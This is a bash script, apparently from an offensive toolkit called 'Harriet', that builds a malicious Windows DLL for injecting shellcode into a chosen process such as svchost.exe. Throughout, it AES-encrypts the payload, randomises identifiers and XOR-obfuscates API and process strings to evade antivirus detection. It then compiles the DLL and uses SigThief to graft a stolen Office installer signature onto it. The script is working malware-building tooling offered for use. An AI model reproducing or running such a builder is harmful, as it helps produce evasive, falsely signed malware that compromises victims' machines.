#!/bin/bash

# Color variables
red='\033[0;31m'
green='\033[0;32m'
yellow='\033[0;33m'
blue='\033[0;34m'
magenta='\033[0;35m'
cyan='\033[0;36m'
# Clear the color after that
clear='\033[0m'
cat << "EOF"
______                              _____      _           _   _              ______ _      _     
| ___ \                            |_   _|    (_)         | | (_)             |  _  \ |    | |    
| |_/ / __ ___   ___ ___  ___ ___    | | _ __  _  ___  ___| |_ _  ___  _ __   | | | | |    | |    
|  __/ '__/ _ \ / __/ _ \/ __/ __|   | || '_ \| |/ _ \/ __| __| |/ _ \| '_ \  | | | | |    | |    
| |  | | | (_) | (_|  __/\__ \__ \  _| || | | | |  __/ (__| |_| | (_) | | | | | |/ /| |____| |____
\_|  |_|  \___/ \___\___||___/___/  \___/_| |_| |\___|\___|\__|_|\___/|_| |_| |___/ \_____/\_____/
                                             _/ |                                                 
                                            |__/                                                  

EOF
echo -e ${green}"Enter The Path To Your Shellcode File. ex: /home/user/Downloads/shellcode.bin"${clear}
echo ""
read Shellcode
echo ""
echo -e ${green}"Enter The Process To Inject To! ex: svchost.exe"${clear}
echo ""
read SVCHOST
echo ""
echo -e ${green}"Name Your Malware! ex: malware.dll"${clear}
echo ""
read MALWARE
echo ""
#Copying Templates
cp Harriet/DLLInj/xor.py Harriet/DLLInj/Resources/xor.py
cp Harriet/DLLInj/template.cpp Harriet/DLLInj/Resources/template.cpp
echo -e ${yellow}"+++Encrypting Payload+++" ${clear}
echo ""
sleep 2
#Getting AES Values
python3 Harriet/DLLInj/Resources/aesencrypt.py $Shellcode > shell.txt
echo -e ${yellow}"***Encryption Completed***"${clear}
echo ""
#REPLACING VALUES
cp shell.txt shell2.txt

#AES REPLACEMENTS

keys=$(cat "shell2.txt")
cut -d 'p' -f1 shell2.txt > shell3.txt
keys=$(cat shell3.txt)
keysnow=${keys#*=}
sed -i "s/KEYVALUE/$keysnow/g" Harriet/DLLInj/Resources/template.cpp

payload=$(cat "shell.txt")
payloadnow=${payload#*;}
payloadtoday=${payloadnow#*=}
echo $payloadtoday > shell5.txt
perl -pe 's/PAYVAL/`cat shell5.txt`/ge' -i Harriet/DLLInj/Resources/template.cpp
sleep 2

#RANDOM VALUE REPLACEMENTS
#AESDecrypt
cat /dev/urandom | tr -dc '[:alpha:]' | fold -w ${1:-20} | head -n 1 > shell.txt
Random1=$(cat shell.txt)
sed -i "s/Random1/$Random1/g" Harriet/DLLInj/Resources/template.cpp
#FindTarget
cat /dev/urandom | tr -dc '[:alpha:]' | fold -w ${1:-18} | head -n 1 > shell.txt
Random2=$(cat shell.txt)
sed -i "s/Random2/$Random2/g" Harriet/DLLInj/Resources/template.cpp
#Inject
cat /dev/urandom | tr -dc '[:alpha:]' | fold -w ${1:-10} | head -n 1 > shell.txt
Random3=$(cat shell.txt)
sed -i "s/Random3/$Random3/g" Harriet/DLLInj/Resources/template.cpp
#AES KEY
cat /dev/urandom | tr -dc '[:alpha:]' | fold -w ${1:-8} | head -n 1 > shell.txt
Random4=$(cat shell.txt)
sed -i "s/Random4/$Random4/g" Harriet/DLLInj/Resources/template.cpp
#AES Payload
cat /dev/urandom | tr -dc '[:alpha:]' | fold -w ${1:-11} | head -n 1 > shell.txt
Random5=$(cat shell.txt)
sed -i "s/Random5/$Random5/g" Harriet/DLLInj/Resources/template.cpp
#VIRTUALALLOC VARIABLE NAME
cat /dev/urandom | tr -dc '[:alpha:]' | fold -w ${1:-11} | head -n 1 > shell.txt
Random6=$(cat shell.txt)
sed -i "s/Random6/$Random6/g" Harriet/DLLInj/Resources/template.cpp
#XOR FUNCTION VARIABLE NAME
cat /dev/urandom | tr -dc '[:alpha:]' | fold -w ${1:-11} | head -n 1 > shell.txt
Random7=$(cat shell.txt)
sed -i "s/Random7/$Random7/g" Harriet/DLLInj/Resources/template.cpp

#Exec VARIABLE
cat /dev/urandom | tr -dc '[:alpha:]' | fold -w ${1:-9} | head -n 1 > shell.txt
Random8=$(cat shell.txt)
sed -i "s/Random8/$Random8/g" Harriet/DLLInj/Resources/template.cpp

#PROCESS NAME VARIABLE
cat /dev/urandom | tr -dc '[:alpha:]' | fold -w ${1:-6} | head -n 1 > shell.txt
Random9=$(cat shell.txt)
sed -i "s/Random9/$Random9/g" Harriet/DLLInj/Resources/template.cpp

#XOR KEY VALUE
cat /dev/urandom | tr -dc '[:alpha:]' | fold -w ${1:-15} | head -n 1 > shell.txt
XOR_KEY=$(cat shell.txt)
sed -i "s/XOR_KEY/$XOR_KEY/g" Harriet/DLLInj/Resources/template.cpp
sed -i "s/XOR_KEY/$XOR_KEY/g" Harriet/DLLInj/Resources/xor.py

#XOR KEY VARIABLE
cat /dev/urandom | tr -dc '[:alpha:]' | fold -w ${1:-17} | head -n 1 > shell.txt
XOR_VARIABLE=$(cat shell.txt)
sed -i "s/XOR_VARIABLE/$XOR_VARIABLE/g" Harriet/DLLInj/Resources/template.cpp


#VIRTUALALLOC - Variable Name
cat /proc/sys/kernel/random/uuid | sed 's/[-]//g' | head -c 20 > virtualalloc.txt
VIRT_ALLOC=$(cat "virtualalloc.txt")
sed -i "s/Alloc_Virtual/$VIRT_ALLOC/g" Harriet/DLLInj/Resources/template.cpp
rm virt*

#VIRTUALALLOC - XOR String

echo VirtualAlloc > virt.txt
python3 Harriet/DLLInj/Resources/xor.py virt.txt > virtalloc.txt
virt=$(cat virtalloc.txt)
virt2="${virt::-8}" 
sed -i "s/VIRALO/$virt2/g" Harriet/DLLInj/Resources/template.cpp 
rm virt*

#PROCESS STRING

echo $SVCHOST > proc.txt
python3 Harriet/DLLInj/Resources/xor.py proc.txt > proc2.txt
process=$(cat proc2.txt)
process2="${process::-8}" 
sed -i "s/PROCY/$process2/g" Harriet/DLLInj/Resources/template.cpp 
rm proc*


#Compiling Malware
echo -e ${yellow}"+++Compiling Malware+++"${clear}
x86_64-w64-mingw32-g++ -shared -o $MALWARE Harriet/DLLInj/Resources/template.cpp -lcomctl32 -Wl,--subsystem,windows -fpermissive -Wno-narrowing >/dev/null 2>&1
echo ""
sleep 2
rm shell*
echo -e ${yellow}"***Malware Compiled***"${clear}
echo ""
echo -e ${yellow}"***Signing DLL***"${clear}
python3 Harriet/Resources/SigThief/sigthief.py -i Harriet/Resources/OfficeSetup.exe -t $MALWARE -o signed$MALWARE >/dev/null 2>&1
mv signed$MALWARE $MALWARE
echo ""
echo -e ${yellow}"***Signature Added. Happy Hunting!**"${clear}
echo ""

